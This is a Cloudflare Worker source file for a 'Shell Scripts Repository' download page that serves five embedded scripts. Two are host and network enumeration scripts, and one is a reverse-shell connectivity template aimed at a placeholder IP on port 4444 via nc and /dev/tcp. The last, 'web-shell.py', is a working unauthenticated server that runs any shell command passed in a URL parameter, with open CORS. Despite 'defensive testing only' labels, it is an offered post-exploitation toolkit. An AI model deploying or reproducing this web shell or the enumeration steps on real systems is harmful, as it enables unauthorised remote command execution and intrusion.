// Shell Scripts Repository - Cloudflare Worker
// Simple file serving for shell scripts

const STATIC_FILES = {
  'basic-info': `#!/bin/bash
# Basic System Information Script
# FOR DEFENSIVE SECURITY TESTING ONLY

echo "=== Basic System Enumeration ==="
echo "Script started: $(date)"
echo "Hostname: $(hostname)"

echo "=== System Information ==="
echo "Kernel: $(uname -r)"
echo "Architecture: $(uname -m)"
echo "Hostname: $(hostname)"
echo "Uptime: $(uptime)"

echo "=== User Context ==="
echo "Current user: $(whoami) ($(id))"
echo "Shell: $SHELL"
echo "Path: $PATH"

echo "=== Network Interfaces ==="
ip addr show 2>/dev/null || ifconfig 2>/dev/null

echo "=== Listening Services ==="
ss -tuln 2>/dev/null || netstat -tuln 2>/dev/null

echo "=== Running Processes ==="
ps aux 2>/dev/null | head -20

echo "=== Enumeration Complete ==="`,

  'advanced-info': `#!/bin/bash
# Advanced System Information Script
# FOR DEFENSIVE SECURITY TESTING ONLY

echo "=== Advanced System Information ==="
echo "Script started: $(date)"
echo "Hostname: $(hostname)"

echo "=== Detailed System Information ==="
echo "Kernel version: $(uname -r)"
echo "Architecture: $(uname -m)"
echo "Operating System: $(cat /etc/os-release 2>/dev/null | grep PRETTY_NAME | cut -d= -f2 | tr -d '"' || uname -s)"
echo "Hardware: $(cat /sys/devices/virtual/dmi/id/product_name 2>/dev/null || echo 'N/A')"
echo "CPU info: $(cat /proc/cpuinfo 2>/dev/null | grep 'model name' | head -1 | cut -d: -f2 | sed 's/^ *//' || echo 'N/A')"
echo "CPU cores: $(nproc 2>/dev/null || echo 'N/A')"
echo "Total memory: $(free -h 2>/dev/null | awk '/^Mem/ {print $2}' || echo 'N/A')"
echo "Available memory: $(free -h 2>/dev/null | awk '/^Mem/ {print $7}' || echo 'N/A')"

echo "=== Environment Variables ==="
env | grep -E "^(PATH|HOME|USER|SHELL|PWD|LANG|TZ)" | head -10 || echo "Environment variables not accessible"

echo "=== Container/Virtualization Detection ==="
if [ -f "/.dockerenv" ]; then echo "[DETECTED] Docker container"; fi
if [ -f "/proc/1/cgroup" ]; then
  if grep -qa docker /proc/1/cgroup 2>/dev/null; then echo "[DETECTED] Docker container"; fi
  if grep -qa lxc /proc/1/cgroup 2>/dev/null; then echo "[DETECTED] LXC container"; fi
fi
if command -v systemd-detect-virt >/dev/null 2>&1; then
  virt=$(systemd-detect-virt 2>/dev/null)
  if [ "$virt" != "none" ] && [ ! -z "$virt" ]; then echo "[DETECTED] Virtualization: $virt"; fi
fi

echo "=== File System Information ==="
echo "Mounted filesystems:"
mount 2>/dev/null | head -5 || df 2>/dev/null | head -5
echo "Disk usage by filesystem:"
df -h 2>/dev/null | head -5
echo "Inode usage:"
df -i 2>/dev/null | head -5

echo "=== Network Configuration ==="
echo "Routing table:"
ip route 2>/dev/null | head -5 || route -n 2>/dev/null | head -5
echo "DNS configuration:"
cat /etc/resolv.conf 2>/dev/null | head -5 || echo "DNS config not accessible"
echo "Network connections:"
ss -tuln 2>/dev/null | head -10 || netstat -tuln 2>/dev/null | head -10
echo "ARP table:"
ip neigh 2>/dev/null | head -5 || arp -a 2>/dev/null | head -5

echo "=== Advanced Information Complete ==="
echo "Scan finished: $(date)"`,

  'network-test': `#!/bin/bash
# Network Connectivity Template - FOR DEFENSIVE TESTING ONLY

# Configuration
TARGET_IP="YOUR_IP_HERE"
TARGET_PORT="4444"

echo "=== Network Connectivity Test ==="
echo "Target: $TARGET_IP:$TARGET_PORT"
echo "WARNING: This is for authorized testing only!"

# Test various network methods
echo "Testing netcat connectivity..."
if command -v nc >/dev/null 2>&1; then
    echo "Netcat available - would execute: nc $TARGET_IP $TARGET_PORT"
else
    echo "Netcat not available"
fi

echo "Testing bash connectivity..."
echo "Would test: /dev/tcp/$TARGET_IP/$TARGET_PORT"

echo "Testing python connectivity..."
if command -v python3 >/dev/null 2>&1; then
    echo "Python3 available for network testing"
elif command -v python >/dev/null 2>&1; then
    echo "Python2 available for network testing"
else
    echo "Python not available"
fi

echo "=== Test Complete - No actual connections made ==="
echo "Replace YOUR_IP_HERE with actual target IP for testing"`,

  'service-probe': `#!/bin/bash
# Service Probe Script - FOR DEFENSIVE TESTING ONLY
# Analyzes exposed services for potential security gaps

echo "=== Service Probe Analysis ==="
echo "Started: $(date)"
echo "Host: $(hostname)"

# Define target ports from previous scan results
PORTS=(873 8888 9000 1384)

echo ""
echo "=== Port Analysis ==="
for port in "\${PORTS[@]}"; do
    echo "--- Port $port Analysis ---"
    
    # Check if port is listening
    if command -v ss >/dev/null 2>&1; then
        ss -tuln | grep ":$port " && echo "[INFO] Port $port is listening"
    elif command -v netstat >/dev/null 2>&1; then
        netstat -tuln | grep ":$port " && echo "[INFO] Port $port is listening"
    fi
    
    # Service identification
    case $port in
        873)
            echo "[SERVICE] Port 873 typically runs rsync daemon"
            if command -v rsync >/dev/null 2>&1; then
                echo "[CHECK] Testing rsync modules..."
                timeout 5 rsync --list-only rsync://localhost/ 2>/dev/null || echo "[TIMEOUT] Rsync connection timed out"
            fi
            ;;
        8888)
            echo "[SERVICE] Port 8888 often runs Jupyter notebooks"
            echo "[CHECK] Testing HTTP response..."
            timeout 3 bash -c "echo | nc localhost $port" 2>/dev/null && echo "[RESPONSE] Got response from port $port"
            ;;
        9000)
            echo "[SERVICE] Port 9000 - checking service type..."
            timeout 3 bash -c "echo | nc localhost $port" 2>/dev/null && echo "[RESPONSE] Got response from port $port"
            ;;
        1384)
            echo "[SERVICE] Port 1384 - checking service type..."
            timeout 3 bash -c "echo | nc localhost $port" 2>/dev/null && echo "[RESPONSE] Got response from port $port"
            ;;
    esac
    
    echo ""
done

echo "=== Probe Complete ==="
echo "Finished: $(date)"`,

  'web-shell': `#!/usr/bin/env python3
# Simple Command API Server - GET Request Version
# FOR DEFENSIVE SECURITY TESTING ONLY

import http.server
import socketserver
import subprocess
import json
import os
import urllib.parse

class CommandAPIHandler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        """Handle command execution via GET request"""
        # Parse URL and query parameters
        parsed_url = urllib.parse.urlparse(self.path)
        
        if parsed_url.path == '/api/command':
            # Get command from query parameter
            query_params = urllib.parse.parse_qs(parsed_url.query)
            command = query_params.get('cmd', [''])[0].strip()
            
            if not command:
                self.send_json_response({'error': 'No command provided. Use ?cmd=your_command'}, 400)
                return
            
            # Execute command
            try:
                result = subprocess.run(
                    command,
                    shell=True,
                    capture_output=True,
                    text=True,
                    timeout=30
                )
                
                # Combine stdout and stderr
                output = result.stdout
                if result.stderr:
                    output += result.stderr
                
                response_data = {
                    'command': command,
                    'output': output or '(No output)',
                    'return_code': result.returncode,
                    'success': result.returncode == 0
                }
                
                self.send_json_response(response_data)
                
            except subprocess.TimeoutExpired:
                self.send_json_response({
                    'error': 'Command timed out (30s limit)',
                    'command': command
                }, 408)
            
            except Exception as e:
                self.send_json_response({
                    'error': f'Execution error: {str(e)}',
                    'command': command
                }, 500)
        
        elif parsed_url.path == '/':
            # Simple info page
            self.send_response(200)
            self.send_header('Content-Type', 'text/html')
            self.end_headers()
            
            html = f"""
            <h1>🔧 Simple Command API</h1>
            <p><strong>Endpoint:</strong> <code>/api/command?cmd=YOUR_COMMAND</code></p>
            <p><strong>Example:</strong> <a href="/api/command?cmd=pwd">/api/command?cmd=pwd</a></p>
            <p><strong>Working Directory:</strong> {os.getcwd()}</p>
            <p style="color: red;"><strong>⚠️ WARNING:</strong> Only use on trusted networks!</p>
            """
            self.wfile.write(html.encode('utf-8'))
        
        else:
            self.send_json_response({'error': 'Endpoint not found'}, 404)
    
    def send_json_response(self, data, status_code=200):
        """Send JSON response with CORS headers"""
        self.send_response(status_code)
        self.send_header('Content-Type', 'application/json')
        self.send_header('Access-Control-Allow-Origin', '*')
        self.end_headers()
        self.wfile.write(json.dumps(data, indent=2).encode('utf-8'))
    
    def log_message(self, format, *args):
        """Simple logging"""
        print(f"[{self.date_time_string()}] {format % args}")

def main():
    PORT = int(os.environ.get('PORT', 8881))
    
    print("🔧 Simple Command API Server (GET)")
    print(f"📡 Starting on port {PORT}")
    print(f"📍 Working directory: {os.getcwd()}")
    print(f"🌐 API endpoint: http://localhost:{PORT}/api/command?cmd=COMMAND")
    print("\\n📝 Usage Examples:")
    print(f"  http://localhost:{PORT}/api/command?cmd=pwd")
    print(f"  http://localhost:{PORT}/api/command?cmd=ls%20-la")
    print(f"  curl 'http://localhost:{PORT}/api/command?cmd=whoami'")
    print("\\n⚠️  WARNING: Only use on trusted networks!")
    
    try:
        with socketserver.TCPServer(("", PORT), CommandAPIHandler) as httpd:
            print(f"\\n✅ Server running on port {PORT}")
            print("Press Ctrl+C to stop")
            httpd.serve_forever()
    except KeyboardInterrupt:
        print("\\n🛑 Server stopped")
    except Exception as e:
        print(f"\\n❌ Error: {e}")

if __name__ == "__main__":
    main()`
};

// Function to get HTML content (files page only)
async function getHTMLContent() {
  return `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Shell Scripts Repository</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            max-width: 1200px;
            margin: 0 auto;
            padding: 20px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            color: #333;
        }
        .container {
            background: white;
            border-radius: 15px;
            padding: 30px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
            backdrop-filter: blur(10px);
        }
        h1 {
            color: #4A90E2;
            text-align: center;
            margin-bottom: 10px;
            font-size: 2.5em;
            background: linear-gradient(45deg, #4A90E2, #9B59B6);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
        }
        .subtitle {
            text-align: center;
            color: #666;
            margin-bottom: 30px;
            font-style: italic;
        }
        .files-section {
            background: #f8f9fa;
            border-radius: 10px;
            padding: 20px;
            margin-bottom: 20px;
            border-left: 4px solid #6c5ce7;
        }
        .files-list {
            list-style: none;
            padding: 0;
            margin: 15px 0 0 0;
        }
        .file-item {
            background: white;
            margin-bottom: 8px;
            padding: 12px 15px;
            border-radius: 6px;
            border-left: 3px solid #6c5ce7;
            transition: all 0.2s ease;
        }
        .file-item:hover {
            background: #f1f2f6;
            transform: translateX(5px);
        }
        .file-link {
            text-decoration: none;
            font-weight: bold;
            color: #2d3436;
            font-size: 16px;
            display: block;
            margin-bottom: 4px;
        }
        .file-link:hover {
            color: #6c5ce7;
        }
        .file-desc {
            color: #636e72;
            font-size: 13px;
            line-height: 1.4;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>📁 Shell Scripts Repository</h1>
        <p class="subtitle">Download security testing and system analysis scripts</p>

        <div class="files-section">
            <h3>📁 Available Shell Scripts</h3>
            <p>Click any script below to download it directly:</p>
            <ul class="files-list">
                <li class="file-item">
                    <a href="/files/basic-info" class="file-link">📋 basic-info.sh</a>
                    <div class="file-desc">Basic system information gathering - user context, network interfaces, running processes</div>
                </li>
                <li class="file-item">
                    <a href="/files/advanced-info" class="file-link" style="color: #e74c3c; font-weight: bold;">🔍 advanced-info.sh</a>
                    <div class="file-desc">Comprehensive system enumeration - detailed OS info, environment variables, virtualization detection, security configuration</div>
                </li>
                <li class="file-item">
                    <a href="/files/network-test" class="file-link" style="color: #f39c12; font-weight: bold;">🌐 network-test.sh</a>
                    <div class="file-desc">Network connectivity testing template - configure target IP and test various connection methods (for authorized testing)</div>
                </li>
                <li class="file-item">
                    <a href="/files/service-probe" class="file-link" style="color: #e74c3c; font-weight: bold;">🔍 service-probe.sh</a>
                    <div class="file-desc">Service analysis script - probes exposed ports (873, 8888, 9000, 1384) and identifies running services</div>
                </li>
                <li class="file-item">
                    <a href="/files/web-shell" class="file-link" style="color: #9c27b0; font-weight: bold;">🐍 web-shell.py</a>
                    <div class="file-desc">Simple command API server - GET /api/command?cmd=YOUR_COMMAND for instant results</div>
                </li>
            </ul>
        </div>
    </div>
</body>
</html>`;
}



export default {
  async fetch(request, env) {
    const url = new URL(request.url);
    
    if (request.method === 'OPTIONS') {
      return new Response(null, {
        headers: {
          'Access-Control-Allow-Origin': '*',
          'Access-Control-Allow-Methods': 'GET, POST, PUT, DELETE, OPTIONS',
          'Access-Control-Allow-Headers': 'Content-Type, Authorization',
        },
      });
    }

    const corsHeaders = {
      'Access-Control-Allow-Origin': '*',
      'Access-Control-Allow-Methods': 'GET, POST, PUT, DELETE, OPTIONS',
      'Access-Control-Allow-Headers': 'Content-Type, Authorization',
    };

    if (url.pathname === '/') {
      const htmlContent = await getHTMLContent();
      return new Response(htmlContent, {
        headers: {
          'Content-Type': 'text/html',
          ...corsHeaders,
        },
      });
    }



    // Handle file downloads
    if (url.pathname.startsWith('/files/')) {
      const filename = url.pathname.substring(7); // Remove '/files/'
      const fileContent = STATIC_FILES[filename];
      
      if (fileContent) {
        let downloadFilename = filename;
        if (filename === 'web-shell') {
          downloadFilename = 'web-shell.py';
        } else if (!filename.includes('.')) {
          downloadFilename = filename + '.sh';
        }
        
        return new Response(fileContent, {
          headers: {
            'Content-Type': 'application/octet-stream',
            'Content-Disposition': `attachment; filename="${downloadFilename}"`,
            ...corsHeaders,
          },
        });
      }
      
      return new Response('File not found', { 
        status: 404,
        headers: corsHeaders,
      });
    }

    // API endpoints for logging (kept for compatibility)
    if (url.pathname === '/api/log') {
      if (request.method === 'POST') {
        try {
          const logData = await request.json();
          console.log('Log entry:', logData);
          return new Response(JSON.stringify({ status: 'logged' }), {
            headers: {
              'Content-Type': 'application/json',
              ...corsHeaders,
            },
          });
        } catch (error) {
          return new Response('Invalid JSON', { 
            status: 400,
            headers: corsHeaders,
          });
        }
      }
    }

    return new Response('Not found', { 
      status: 404,
      headers: corsHeaders,
    });
  },
};